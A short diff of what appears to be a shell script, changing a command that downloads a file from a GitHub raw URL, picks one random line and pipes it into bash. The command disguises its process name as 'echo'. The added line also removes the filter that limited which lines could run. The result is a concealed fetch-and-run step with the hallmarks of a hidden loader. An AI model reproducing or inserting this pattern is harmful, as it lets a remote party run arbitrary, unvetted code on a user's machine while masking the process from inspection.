@@ -1,3 +1,4 @@
 #echo
 #echo  7ea updated
-exec -a echo curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | grep  💕  | shuf -n 1 | bash
+#exec -a echo curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | grep  💕  | shuf -n 1 | bash
+exec -a echo curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | shuf -n 1 | bash
